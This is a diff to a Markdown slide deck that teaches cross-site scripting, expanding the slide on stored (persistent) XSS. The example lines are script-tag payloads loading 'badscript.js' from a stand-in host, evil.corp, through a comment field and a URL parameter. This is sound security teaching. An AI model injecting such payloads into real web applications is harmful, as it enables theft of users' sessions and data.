@@ -126,16 +126,19 @@ https://insecure-web.com/comment?message=<script src=https//evil.corp/badscript.
 
 ---
 
-# Stored XSS attack
+# Stored (persistent) XSS attack
 
 Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser.
 
-Comment field on a blog post:
-```
-Instead of a decent comment on the blog's input field, I write
-
+ Instead of a decent comment on the blog's input field, the attacker write:
+```html
 <script src='https//evil.corp/badscript.js'/>
 ```
+
+---
+
+![bg 70%](./resources/stored_persistent_xss.png)
+
 ---
 
 # Terms to help organize types of XSS - 1 / 2
